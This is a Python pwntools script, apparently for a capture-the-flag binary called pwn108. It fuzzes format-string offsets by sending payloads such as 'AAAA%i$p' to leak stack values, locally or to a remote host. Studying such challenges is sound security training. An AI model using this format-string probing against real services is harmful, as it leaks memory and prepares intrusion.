from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
piebase
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './pwn108.pwn108'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'warning'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Let's fuzz x values
for i in range(1, 20):
    try:
        p = start()
        # Send the name value
        p.recvuntil('=[Your name]:')
        p.sendline('Pwner')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendlineafter(b':', 'AAAA%{}$p'.format(i).encode())
        # Receive the response
        p.recvuntil(b'Register no  : ')
        result = p.recvline()
        print(str(i) + ': ' + str(result))
        p.close()
    except EOFError:
        pass